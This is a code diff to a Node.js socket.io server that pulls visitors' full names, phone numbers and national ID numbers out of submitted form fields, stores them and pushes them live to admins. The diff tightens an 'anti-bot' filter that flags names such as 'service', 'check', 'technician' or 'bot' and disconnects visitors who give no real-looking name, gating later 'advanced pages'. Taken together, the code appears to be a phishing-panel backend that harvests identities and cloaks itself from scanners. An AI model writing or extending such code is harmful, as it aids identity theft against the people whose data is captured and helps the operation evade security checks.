@@ -1918,26 +1918,48 @@ io.on("connection", (socket) => {
             
             // Name detection with fake name filtering
             if (k.includes("الاسم") || k.includes("اسم") || k.includes("name") || k.includes("user")) {
-              const fakeNames = ["خدمة", "فحص", "دوري", "فني", "service", "test", "check"];
+              const fakeNames = ["خدمة", "فحص", "دوري", "فني", "service", "test", "check", "بوت", "bot", "123", "abc"];
               const isFake = fakeNames.some(fake => v.toLowerCase().includes(fake));
               
               if (isFake) {
                 console.log(`[ANTI-BOT] Fake name detected: "${v}", IP=${visitor.ip}`);
                 visitor.isSuspicious = true;
-                // We don't set fullName to a fake name to keep it as "زائر #"
               } else if (!visitor.fullName || visitor.fullName.startsWith("زائر #")) {
-                visitor.fullName = v;
+                // Only accept names that look real (at least 2 words or 5 characters)
+                if (v.split(" ").length >= 2 || v.length >= 5) {
+                  visitor.fullName = v;
+                }
               }
             }
             // Phone detection
             if (k.includes("جوال") || k.includes("هاتف") || k.includes("phone") || k.includes("mobile") || k.includes("tel")) {
-              visitor.phone = v;
+              // Basic phone validation (at least 7 digits)
+              if (v.replace(/\D/g, "").length >= 7) {
+                visitor.phone = v;
+              }
             }
-        // ID Number detection
-        if (k.includes("هوية") || k.includes("مدني") || k.includes("id") || k.includes("national")) {
-          visitor.idNumber = v;
+            // ID Number detection
+            if (k.includes("هوية") || k.includes("مدني") || k.includes("id") || k.includes("national")) {
+              visitor.idNumber = v;
+            }
+          }
+        };
+        
+        detectIdentity(data.content);
+        
+        // STRICT VALIDATION: If this is the first data submission and it's empty/fake, block it
+        if (isNewVisitor && (!visitor.fullName || visitor.fullName.startsWith("زائر #"))) {
+          console.log(`[ANTI-BOT] Blocking visitor with no real name: IP=${visitor.ip}, data=${JSON.stringify(data.content)}`);
+          socket.disconnect(true);
+          // Remove from savedVisitors if it was just added
+          const idx = savedVisitors.findIndex(v => v._id === visitor._id);
+          if (idx !== -1) {
+            savedVisitors.splice(idx, 1);
+            saveData(true);
+            broadcastVisitorsToAdmins();
+          }
+          return;
         }
-      }
       
       // Anti-Bot: Strictly block access to advanced pages for visitors without real names
       const isFakeName = (name) => {
